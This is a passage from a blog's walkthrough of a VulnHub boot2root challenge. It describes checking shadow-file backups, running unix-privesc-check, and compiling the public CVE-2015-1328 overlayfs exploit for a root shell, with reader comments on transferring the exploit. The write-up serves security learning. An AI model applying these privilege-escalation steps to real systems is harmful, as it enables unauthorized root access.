<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">shadow</span><span class="w">     </span><span class="mi">577</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="w"> </span><span class="n">gshadow</span><span class="o">.</span><span class="n">bak</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">1143</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="w"> </span><span class="n">passwd</span><span class="o">.</span><span class="n">bak</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">shadow</span><span class="w">     </span><span class="mi">939</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="w"> </span><span class="n">shadow</span><span class="o">.</span><span class="n">bak</span>
</code></pre></div>
<p>This backups are copied by the daily crontab. A solution may be to attempt to a
race condition against it. I have not dig into the subject.</p>
<p>I also used
<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privsec-check</a>
in order to search for the privilege escalation.</p>
<h2>CVE-2015-1328</h2>
<p>I had a bit stop to search for the privilege escalation when I saw that an
exploit as been published for the
<a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html">CVE-2015-1328</a>,
which use the incorrect permission check in overlayfs in Ubuntu to give root
privileges: <a href="http://seclists.org/oss-sec/2015/q2/717">http://seclists.org/oss-sec/2015/q2/717</a></p>
<p>Hopefully we are on a vulnerable Ubuntu. So I compiled <code>ofs.c</code> with <code>gcc</code> and
launch it, well it works and give me immediately a root shell.</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@Huhuhhhhhuhuhhh</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">butthead</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">SECRETZ</span>
<span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">great</span><span class="w"> </span><span class="n">job</span><span class="p">,</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">shoot</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">email</span>
<span class="ow">and</span><span class="w"> </span><span class="n">let</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">beat</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">box</span><span class="err">!</span>

<span class="n">SECRET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK"</span>

<span class="k">admin</span><span class="nv">@top</span><span class="o">-</span><span class="n">hat</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<h1>Conclusion</h1>
<p>This was a nice challenge as I learned a lot about the port knocking. The
privilege escalation was quit interesting to search for and the CVE-2015-1328
exploitation was a lot of fun.</p>
<p>Thank you <a href="http://top-hat-sec.com">top-hat-sec</a> for this challenge and
<a href="http://vulnhub.com">vulnhub</a> as always.</p>
<h1>Disqus comments</h1>
<p><em>This is a copy of the Disqus comments for this page</em></p>
<p><strong>Lamia Ladypower - 2015</strong></p>
<blockquote>
<p>Thank you for your solution. I liked how you thought specially in the last part (finding the vulnerability in ubuntu). But, i have one question, how did you import the script ofs.c to ubuntu server ?
I am waiting for your reply.
Thank you in advance</p>
</blockquote>
<p><strong>maggick - 2015</strong></p>
<blockquote>
<p>As you get a shell, there is a lot of solutions:
scp (as you mentioned), netcat or even the copy-paste support from your terminal.</p>
</blockquote>
<p><strong>Lamia Ladypower - 2015</strong></p>
<blockquote>
<p>I solved the problem. I used scp</p>
</blockquote>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/challenge.html">challenge</a>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/linux.html">linux</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2015/05/blog-changes-2.html" title="Blog changes #2">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2015/08/localipsum-a-sample-text-generator.html" title="Localipsum, a sample text generator">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>